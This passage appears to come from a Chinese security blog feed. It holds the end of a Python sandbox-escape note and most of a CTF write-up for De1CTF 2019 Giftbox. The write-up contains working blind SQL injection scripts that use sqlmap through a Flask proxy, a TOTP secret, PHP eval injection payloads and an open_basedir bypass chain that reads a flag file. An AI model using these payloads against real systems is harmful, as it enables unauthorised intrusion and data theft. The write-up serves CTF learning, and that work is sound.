class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteCodec&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;MultibyteStreamWriter&#x27;</span>&gt;]</span><br></pre></td></tr></table></figure></div><p><strong>_<em>subclasses</em>_()</strong> ：查看当前类的子类。</p><p>当然我们也可以直接用 **object._<em>subclasses</em><em>()**，会得到和上面一样的结果。<br>获取基类还能用还有 **_<em>mro</em></em>**，比如：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用索引获取基类</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><h1 id="力推参考学习"><a href="#力推参考学习" class="headerlink" title="力推参考学习"></a>力推参考学习</h1><p><a href="https://blog.csdn.net/qq_43390703/article/details/104256001">python沙箱逃逸</a></p><p><a href="https://github.com/epinna/tplmap">SSTi神器–Tplmap</a></p><p><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">SSTI注入语句总结</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/80393854">python沙箱逃逸一些套路的小结</a></p><p><a href="https://www.freebuf.com/articles/system/203208.html">一文看懂Python沙箱逃逸</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
    <category term="渗透" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF Giftbox题解</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/02/De1CTFGiftbox/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/02/De1CTFGiftbox/</id>
    <published>2020-04-02T10:50:48.019Z</published>
    <updated>2023-04-18T21:45:59.775Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>一道可以学习到很多的题目，还是自己太菜了，要看大佬的wp才能完全了解透彻</p><h1 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h1><p>题目打开，只能感慨大师傅还是大师傅，题目前端做成这个效果，太顶了</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" data-fancybox="group" data-caption="gift1" class="fancybox"><img alt="gift1" title="gift1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" class="lazyload"></a></p><p>看样子是个 <code>linux终端</code>, 然后看一下有哪些命令可以调用</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" data-fancybox="group" data-caption="gift2" class="fancybox"><img alt="gift2" title="gift2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" class="lazyload"></a></p><p>试一下相应的命令，看一下效果</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" data-fancybox="group" data-caption="gift3" class="fancybox"><img alt="gift3" title="gift3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" class="lazyload"></a></p><p>看到了 <code>usage.md</code> 有新的 <code>hint</code>，尝试一下</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" data-fancybox="group" data-caption="gift4" class="fancybox"><img alt="gift4" title="gift4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" class="lazyload"></a></p><p>可以看到，都需要先登陆，那就尝试一下 <code>sql注入</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[de1ta<span class="variable">@de1ta</span><span class="operator">-</span>mbp <span class="operator">/</span>sandbox]<span class="operator">%</span> login admin<span class="string">&#x27;and/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> admin</span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta<span class="variable">@de1ta</span><span class="operator">-</span>mbp <span class="operator">/</span>sandbox]<span class="operator">%</span> login admin<span class="string">&#x27;and/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">0</span> admin</span><br><span class="line">login fail, <span class="keyword">user</span> <span class="keyword">not</span> found.</span><br></pre></td></tr></table></figure></div><p>查看数据包，看到有个 **<code>totp</code>**，再次提交之后这个 <strong><code>totp</code></strong> 又会发生改变</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" class="lazyload"></a></p><hr><h2 id="查了一下-TOTP"><a href="#查了一下-TOTP" class="headerlink" title="查了一下 TOTP"></a>查了一下 TOTP</h2><p><a href="https://baike.baidu.com/item/TOTP%E7%AE%97%E6%B3%95/22810708?fr=aladdin">TOTP算法</a> (<code>Time-based One-time Password algorithm</code>)是一种从共享密钥和当前时间计算一次性密码的算法。</p><p>**<font color="6495ED">一些要求</font>**：</p><ul><li>令牌与服务器之间必须时钟同步；</li><li>令牌与服务器之间必须共享密钥；</li><li>令牌与服务器之间必须使用相同的时间步长</li></ul><p>**<font color="6495ED">核心算法</font>**：<br><strong><font color="6495ED">TOTP &#x3D;Truncate(HMAC-SHA-1(K, (T - T0) &#x2F; X))</font></strong><br><strong><font color="6495ED">X</font></strong> 是时间间隔</p><hr><p>然后在 <code>main.js</code> 找到了密钥</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" class="lazyload"></a></p><p>在这上面的注释里也给出了提示</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="title class_">Developer</span> <span class="title class_">Notes</span>]</span><br><span class="line"><span class="variable constant_">OTP</span> <span class="title class_">Library</span> <span class="keyword">for</span> <span class="title class_">Python</span> located <span class="keyword">in</span> js/pyotp.<span class="property">zip</span></span><br><span class="line"><span class="title class_">Server</span> <span class="title class_">Params</span>:</span><br><span class="line">digits = <span class="number">8</span></span><br><span class="line">interval = <span class="number">5</span></span><br><span class="line"><span class="variable language_">window</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>然后跟进去看 <code>totp.min.js</code> 可以看到最后有新的 <code>hint</code> (虽然作用不大233</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Two</span>-factor authentication implementation <span class="keyword">in</span> pure javascript.</span><br><span class="line"><span class="title class_">One</span>-time password generator (<span class="variable constant_">HOTP</span>/<span class="variable constant_">TOTP</span>) <span class="keyword">with</span> support <span class="keyword">for</span> <span class="title class_">Google</span> <span class="title class_">Authenticator</span>.</span><br><span class="line">@author   wuyanxin &lt;<span class="attr">https</span>:<span class="comment">//wuyanxin.com&gt;</span></span><br><span class="line">@license  <span class="variable constant_">MIT</span></span><br></pre></td></tr></table></figure></div><p>然后在gay吧找到了 <a href="https://github.com/wuyanxin/totp.js">https://github.com/wuyanxin/totp.js</a><br>(算法还是挺好理解的)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" class="lazyload"></a></p><p>可以看到缺省值就是5</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" class="lazyload"></a></p><p>然后看了大佬的写法</p><hr><h2 id="获取-sql-密码"><a href="#获取-sql-密码" class="headerlink" title="获取 sql 密码"></a>获取 sql 密码</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>用 <code>flask</code> 搭建一个本地服务并接受参数传到靶机，然后用 <code>sqlmap</code> 去跑本地靶机</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">totp=pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">s=requests.session()</span><br><span class="line">fuzz=string.printable</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/username=&lt;username&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">username</span>):</span><br><span class="line">    url=<span class="string">&#x27;http://link-site/shell.php&#x27;</span></span><br><span class="line">    username=(username).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;login &#123;&#125; admin&#x27;</span>.<span class="built_in">format</span>(username),</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,params=params)</span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div><p>启动之后 用 <code>sqlmap</code> 去跑</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1:5000/username=admin*&quot;</span> -D giftbox -T <span class="built_in">users</span> -C password --dump  --technique B</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:5000/username=admin*&quot;</span></span><br></pre></td></tr></table></figure></div><p>得到密码: <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>来自<a href="https://www.zhaoj.in/read-6170.html">赵师傅</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># --- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_get</span>(<span class="params">payload</span>):</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login admin\&#x27;/**/and/**/(&#x27;</span> + payload + <span class="string">&#x27;)/**/and/**/\&#x27;1\&#x27;=\&#x27;1 admin&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;,data=&#123;<span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;pos&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;usage.md&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;login admin\&#x27;/**/and/**/(&#x27;</span> + payload + <span class="string">&#x27;)/**/and/**/\&#x27;1\&#x27;=\&#x27;1 admin&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_databases</span>():</span><br><span class="line">    <span class="comment"># db_nums_payload = &quot;select/**/count(*)/**/from/**/users&quot;</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print(&quot;长度为：%d&quot; % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    db_payload = <span class="string">&quot;select/**/concat(password)/**/from/**/users&quot;</span></span><br><span class="line">    db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">&quot;ascii(substr((&quot;</span> + db_payload + <span class="string">&quot;),%d,1))&quot;</span> % (y)</span><br><span class="line">        db_name += <span class="built_in">chr</span>(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;值：&quot;</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分法函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">half</span>(<span class="params">payload</span>):</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">&quot;%s/**/&gt;/**/%d&quot;</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = <span class="built_in">int</span>((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>同样会得到密码: <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p><hr><h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br><span class="line">login success.</span><br></pre></td></tr></table></figure></div><p>然后试一下 <code>targeting</code> <code>launch</code> <code>destruct</code> 等等命令</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" class="lazyload"></a></p><p>以及 <code>hint</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named <span class="string">&#x27;eval&#x27;</span> when launching missiles.</span><br></pre></td></tr></table></figure></div><p>看到 <code>eval</code> 知道考点是RCE代码注入<br>然后网上找到了这个<a href="https://xz.aliyun.com/t/4785">从一道题讲PHP复杂变量</a></p><ul><li>php会处理双引号里面的东西，所以：</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;<span class="subst">$a</span>&quot;</span>;  输出abc</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;\$a&quot;</span>; 输出<span class="variable">$a</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;$a&#x27;</span>;  输出<span class="variable">$a</span></span><br></pre></td></tr></table></figure></div><ul><li>如果 <code>&#123;</code> 和 <code>$</code> 紧挨着也会表示一个变量</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$great</span> = <span class="string">&#x27;fantastic&#x27;</span>;</span><br><span class="line"></span><br><span class="line">无效，输出: This is &#123; fantastic&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is &#123; <span class="subst">$great</span>&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">有效，输出： This is fantastic</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is <span class="subst">&#123;$great&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is $&#123;great&#125;&quot;</span>;</span><br></pre></td></tr></table></figure></div><ul><li>bypass<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;$&#123;phpinfo()&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="variable">$a</span>=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;;</span><br></pre></td></tr></table></figure></div></li></ul><p>照着上面的思路 </p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" data-fancybox="group" data-caption="gift9_2" class="fancybox"><img alt="gift9_2" title="gift9_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" class="lazyload"></a></p><p>将 <code>Error</code> 的 内容保存本地 可以看到就是 <code>phpinfo</code></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" class="lazyload"></a></p><p>可以看到 <code>open_basedir</code> 限制了路径<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" class="lazyload"></a></p><p>然后看一下其他过滤</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" class="lazyload"></a></p><p><strong><font color="6495ED">code</font></strong> 长度限制2位</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" class="lazyload"></a></p><p><strong><font color="6495ED">position</font></strong> 长度限制12位，同样都存在 <code>\</code> 的过滤(其实也简单，用 <code>chr()</code> 绕过)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" class="lazyload"></a></p><p>总结一下运行过程</p><ul><li><font color="6495ED">targeting code position</font> -&gt; 储存一条 <code>$code = &quot;position&quot;</code>;</li><li><font color="6495ED">launch</font> -&gt; 将上面 <code>targeting</code> 的 <code>code</code>  按照字典顺序跑一遍</li><li><font color="6495ED">destuct</font> -&gt; 全部清空，恢复初始状态</li></ul><p>然后按照上面 <a href="https://xz.aliyun.com/t/4720">open_basedir绕过</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;img&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag&#x27;</span>));</span><br></pre></td></tr></table></figure></div><h2 